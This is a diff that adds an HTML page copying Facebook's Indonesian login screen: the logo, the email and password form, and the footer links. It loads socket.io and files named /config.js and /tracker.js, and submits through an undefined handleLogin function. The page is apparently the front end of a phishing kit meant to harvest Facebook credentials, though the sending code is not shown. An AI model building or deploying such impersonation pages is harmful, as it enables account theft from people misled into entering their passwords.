@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook - Masuk atau Daftar</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+.logo{margin-bottom:20px;text-align:center}
+.logo svg{width:48px;height:48px}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px 16px 28px;width:396px;max-width:100%}
+.card h2{color:#1c1e21;font-size:18px;font-weight:400;line-height:22px;text-align:center;padding-bottom:16px;border-bottom:1px solid #dadde1;margin-bottom:16px}
+.form-group{margin-bottom:12px}
+.form-group input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;color:#1c1e21;outline:none;transition:border-color .15s;background:#fff}
+.form-group input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+.form-group input::placeholder{color:#90949c}
+.password-wrap{position:relative}
+.password-wrap input{padding-right:50px}
+.toggle-pass{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:#1877f2;font-size:14px;font-weight:500;cursor:pointer;padding:4px 6px;border-radius:4px}
+.toggle-pass:hover{background:#e7f3ff}
+.login-btn{width:100%;padding:12px;background:#1877f2;border:none;border-radius:6px;color:#fff;font-size:20px;font-weight:700;cursor:pointer;transition:background .15s}
+.login-btn:hover{background:#166fe5}
+.login-btn:active{background:#1a6ed8}
+.forgot-link{display:block;text-align:center;margin:16px 0;font-size:14px;font-weight:500}
+.forgot-link a{color:#1877f2;text-decoration:none}
+.forgot-link a:hover{text-decoration:underline}
+.divider{display:flex;align-items:center;margin:20px 0 24px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dadde1}
+.divider span{padding:0 16px;color:#606770;font-size:12px;font-weight:500}
+.signup-btn{display:block;margin:0 auto;padding:12px 20px;background:#42b72a;border:none;border-radius:6px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;transition:background .15s;line-height:20px}
+.signup-btn:hover{background:#36a420}
+.footer{margin-top:28px;text-align:center;font-size:12px;color:#737373;max-width:396px}
+.footer a{color:#385898;text-decoration:none}
+.footer a:hover{text-decoration:underline}
+@media(max-width:460px){.card{width:100%}body{padding:12px}.card h2{font-size:16px}.login-btn{font-size:18px}}
+</style>
+</head>
+<body>
+<div class="logo">
+<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+<rect width="48" height="48" rx="8" fill="#1877F2"/>
+<path d="M30.2 24.5L31.1 18.6H25.5V14.8C25.5 13.2 26.3 11.6 28.9 11.6H31.3V6.5C31.3 6.5 28.9 6 26.5 6C21.7 6 18.5 8.9 18.5 14.3V18.6H13.4V24.5H18.5V41.7C19.6 41.9 20.7 42 21.9 42C23.1 42 24.2 41.9 25.4 41.7V24.5H30.2Z" fill="white"/>
+</svg>
+</div>
+<div class="card">
+<h2>Masuk ke Facebook</h2>
+<form id="loginForm" onsubmit="handleLogin(event)">
+<div class="form-group">
+<input type="text" id="emailInput" placeholder="Email atau Nomor Telepon" autocomplete="username" autocapitalize="off" required>
+</div>
+<div class="form-group">
+<div class="password-wrap">
+<input type="password" id="passInput" placeholder="Kata Sandi" autocomplete="current-password" required>
+<button type="button" id="togglePassBtn" class="toggle-pass">Lihat</button>
+</div>
+</div>
+<button type="submit" id="loginBtn" class="login-btn">Masuk</button>
+</form>
+<div class="forgot-link"><a href="#">Lupa kata sandi?</a></div>
+<div class="divider"><span>atau</span></div>
+<button class="signup-btn" onclick="window.location.href='#'">Buat Akun Baru</button>
+</div>
+<div class="footer">
+<a href="#">English (US)</a> &middot; <a href="#">Bahasa Indonesia</a> &middot; <a href="#">中文(简体)</a><br>
+<a href="#">Daftar</a> &middot; <a href="#">Masuk</a> &middot; <a href="#">Messenger</a> &middot; <a href="#">Facebook Lite</a> &middot; <a href="#">Video</a> &middot; <a href="#">Tempat</a> &middot; <a href="#">Game</a> &middot; <a href="#">Marketplace</a> &middot; <a href="#">Meta Pay</a><br>
+<a href="#">Meta Store</a> &middot; <a href="#">Meta Quest</a> &middot; <a href="#">Instagram</a> &middot; <a href="#">Threads</a><br>
+<a href="#">Penggalangan Dana</a> &middot; <a href="#">Layanan</a> &middot; <a href="#">Pusat Informasi Pemilu</a> &middot; <a href="#">Kebijakan Privasi</a> &middot; <a href="#">Pusat Privasi</a><br>
+<a href="#">Grup</a> &middot; <a href="#">Tentang</a> &middot; <a href="#">Buat Iklan</a> &middot; <a href="#">Buat Halaman</a> &middot; <a href="#">Pengembang</a> &middot; <a href="#">Karier</a><br>
+<a href="#">Cookie</a> &middot; <a href="#">Pilihan Iklan</a> &middot; <a href="#">Ketentuan</a> &middot; <a href="#">Bantuan</a><br>
+<small>Meta &copy; 2026</small>
+</div>
+<script src="/config.js"></script>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script src="/tracker.js"></script>
+</body>
+</html>
